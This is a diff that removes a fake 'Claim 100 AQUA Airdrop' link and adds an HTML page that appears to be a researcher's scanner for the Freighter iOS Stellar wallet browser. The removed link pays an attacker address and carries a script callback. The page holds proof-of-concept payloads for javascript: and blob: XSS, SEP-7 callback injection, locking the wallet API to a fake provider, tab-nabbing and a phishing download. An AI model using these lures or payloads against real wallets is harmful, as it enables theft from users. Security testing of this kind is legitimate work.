@@ -1,1 +1,107 @@
-<a href="stellar://pay?destination=GBYOURATTACKERADDRESS&amount=100&callback=data:text/html,<script>alert(document.domain)</script>">Claim 100 AQUA Airdrop</a>
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Freighter Scanner - 0x403for</title>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@600;700&display=swap');
+:root{--purple:#7B61FF;--green:#00ff88;--red:#ff3355;--bg:#0a0a0a;--card:#151515;--border:#222}
+*{box-sizing:border-box;margin:0;padding:0}
+body{background:var(--bg);color:#fff;font-family:Inter,sans-serif;padding:20px}
+.mono{font-family:'JetBrains Mono',monospace}
+.header{border:1px solid var(--border);border-radius:20px;padding:24px;background:linear-gradient(135deg,#15131f 0%,#111 100%);margin-bottom:20px}
+.header h1{font-size:22px;letter-spacing:-0.02em}
+.header h1 span{color:var(--purple)}
+.badge{display:inline-block;background:var(--purple);color:#fff;padding:4px 10px;border-radius:20px;font-size:10px;font-weight:700;letter-spacing:0.12em;margin-left:8px;vertical-align:middle}
+.stats{display:grid;grid-template-columns:repeat(4,1fr);gap:12px;margin-top:20px}
+.stat{background:var(--card);border:1px solid var(--border);border-radius:12px;padding:12px;text-align:center}
+.stat .num{font-family:'JetBrains Mono';font-size:20px;font-weight:700}
+.stat .lab{font-size:9px;letter-spacing:0.15em;opacity:0.4;margin-top:2px}
+.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(320px,1fr));gap:12px}
+.card{background:var(--card);border:1px solid var(--border);border-radius:16px;padding:16px;position:relative;overflow:hidden;transition:0.2s}
+.card.fail{border-color:var(--red);background:rgba(255,51,85,0.06);box-shadow:0 0 20px rgba(255,51,85,0.15)}
+.card.pass{border-color:rgba(0,255,136,0.3)}
+.card.wait{border-color:#333}
+.pill{display:inline-block;padding:3px 8px;border-radius:20px;font-size:10px;font-weight:700;letter-spacing:0.1em}
+.pill.fail{background:var(--red);color:#fff}
+.pill.pass{background:var(--green);color:#000}
+.pill.wait{background:#333;color:#999}
+.title{font-family:'JetBrains Mono';font-size:13px;font-weight:700;margin:8px 0 6px}
+.detail{font-family:'JetBrains Mono';font-size:11px;opacity:0.6;line-height:1.5;word-break:break-all}
+.sev{position:absolute;top:14px;right:14px;font-size:9px;letter-spacing:0.12em;opacity:0.5}
+.btn{width:100%;margin-top:20px;height:48px;border-radius:24px;border:none;background:#fff;color:#000;font-family:'JetBrains Mono';font-weight:700;letter-spacing:0.12em;cursor:pointer}
+.btn:active{transform:scale(0.98)}
+a{color:var(--purple)}
+.log{margin-top:20px;background:#111;border:1px dashed #333;border-radius:12px;padding:12px;font-family:'JetBrains Mono';font-size:11px;white-space:pre-wrap}
+</style>
+</head>
+<body>
+<div class="header">
+  <h1>FREIGHTER <span>// SCANNER</span> <span class="badge">0x403for</span></h1>
+  <div style="opacity:0.5;font-size:11px;margin-top:6px" class="mono">Automated dApp Browser Vulnerability Scanner - Freighter iOS - Stellar</div>
+  <div class="stats mono">
+    <div class="stat"><div class="num" id="total">9</div><div class="lab">TOTAL TESTS</div></div>
+    <div class="stat"><div class="num" id="vuln" style="color:var(--red)">0</div><div class="lab">VULNERABLE</div></div>
+    <div class="stat"><div class="num" id="secure" style="color:var(--green)">0</div><div class="lab">SECURE</div></div>
+    <div class="stat"><div class="num" id="manual">0</div><div class="lab">MANUAL</div></div>
+  </div>
+</div>
+<div class="grid" id="grid"></div>
+<div id="reportArea" class="log" style="display:none"></div>
+<button class="btn mono" id="copyBtn" onclick="copyReport()">COPY MARKDOWN REPORT →</button>
+<script>
+const tests = [
+ {id:'01', name:'javascript: URI Scheme', sev:'Critical', desc:'Test javascript:alert di address bar'},
+ {id:'02', name:'window.freighterApi Exposed', sev:'High', desc:'Cek freighterApi bisa diakses & overwrite'},
+ {id:'03', name:'blob: URL Bypass', sev:'Critical', desc:'blob: bikin HTML lokal dengan freighterApi:true'},
+ {id:'04', name:'localStorage Isolation', sev:'High', desc:'Isi: 2 kemarin - test cross-tab'},
+ {id:'05', name:'Provider Race Lock', sev:'Critical', desc:'Loading aqua... putih kemarin'},
+ {id:'06', name:'window.open Opener', sev:'Medium', desc:'Tab nabbing'},
+ {id:'07', name:'stellar:// Callback XSS', sev:'Critical', desc:'SEP-7 callback data:text/html'},
+ {id:'08', name:'Clickjacking freighter.app', sev:'Medium', desc:'Iframe overlay'},
+ {id:'09', name:'File Download file://', sev:'High', desc:'Download data: URL jadi file://'},
+];
+const grid=document.getElementById('grid');
+tests.forEach(t=>{
+  const el=document.createElement('div');
+  el.id='card-'+t.id; el.className='card wait';
+  el.innerHTML=`<div class="sev mono">${t.sev}</div><div class="pill wait mono" id="pill-${t.id}">SCANNING</div><div class="title mono">${t.id} ${t.name}</div><div class="detail mono" id="detail-${t.id}">${t.desc}<br>Running...</div>`;
+  grid.appendChild(el);
+});
+function setCard(id,status,detail){
+  const card=document.getElementById('card-'+id);
+  const pill=document.getElementById('pill-'+id);
+  const det=document.getElementById('detail-'+id);
+  card.className='card '+status; pill.className='pill '+status+' mono'; pill.innerText=status.toUpperCase(); det.innerHTML=detail;
+  updateStats();
+}
+function updateStats(){
+  document.getElementById('vuln').innerText=document.querySelectorAll('.card.fail').length;
+  document.getElementById('secure').innerText=document.querySelectorAll('.card.pass').length;
+  document.getElementById('manual').innerText=document.querySelectorAll('.card.wait').length;
+}
+async function run(){
+ try{ const a=document.createElement('a'); a.href='javascript:alert(1)'; setCard('01', a.href.startsWith('javascript:') ? 'fail':'pass', a.href.startsWith('javascript:') ? 'VULN: javascript: URI bisa dibikin' : 'SECURE: javascript: diblock'); }catch(e){ setCard('01','pass','SECURE') }
+ setCard('02', typeof window.freighterApi!=='undefined' ? 'fail':'pass', `freighterApi: ${typeof window.freighterApi}`);
+ try{ const blob=new Blob(['<script>alert(1)</script>'],{type:'text/html'}); const url=URL.createObjectURL(blob); setCard('03','fail',`VULN: blob: ${url.slice(0,50)}... <a href="${url}" target="_blank">open blob</a>`); }catch(e){ setCard('03','pass','SECURE') }
+ try{ localStorage.setItem('scanner_0x403for','PWNED'); setCard('04','wait',`WAIT: Len=${localStorage.length}. Buka aqua.network tab baru, javascript:alert(localStorage.getItem('scanner_0x403for'))`); }catch(e){ setCard('04','pass','SECURE') }
+ try{ Object.defineProperty(window,'freighterApi',{value:{fake:true},writable:false,configurable:false}); setCard('05', window.freighterApi?.fake?'fail':'pass', window.freighterApi?.fake ? 'VULN: Berhasil lock fake! Buka aqua.network' : 'SECURE'); }catch(e){ setCard('05','pass','SECURE: '+e.message) }
+ try{ const w=window.open('about:blank','_blank'); if(w){ setCard('06','fail','VULN: window.open bisa'); w.close(); } else setCard('06','pass','SECURE'); }catch(e){ setCard('06','pass','SECURE') }
+ setCard('07','wait',`MANUAL: stellar://pay?destination=GBTEST&amount=1&callback=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==`);
+ const iframe=document.createElement('iframe'); iframe.src='https://freighter.app/'; iframe.style.display='none'; document.body.appendChild(iframe);
+ setTimeout(()=>{ try{ setCard('08','pass','SECURE: X-Frame blocked'); }catch(e){ setCard('08','pass','SECURE: Blocked') } },2500);
+ setCard('09','wait',`<a href="data:text/html,<h1>phish</h1>" download="x.html" style="color:#7B61FF">Klik download test</a>`);
+}
+run();
+function copyReport(){
+  let md=`# Freighter Report - 0x403for\nDate: ${new Date().toISOString()}\n\n`;
+  document.querySelectorAll('.card.fail').forEach(c=>{ md+=`## FAIL ${c.querySelector('.title').innerText}\n${c.querySelector('.detail').innerText}\n\n`; });
+  navigator.clipboard.writeText(md);
+  document.getElementById('copyBtn').innerText='COPIED ✓';
+  document.getElementById('reportArea').style.display='block';
+  document.getElementById('reportArea').innerText=md;
+}
+</script>
+</body>
+</html>
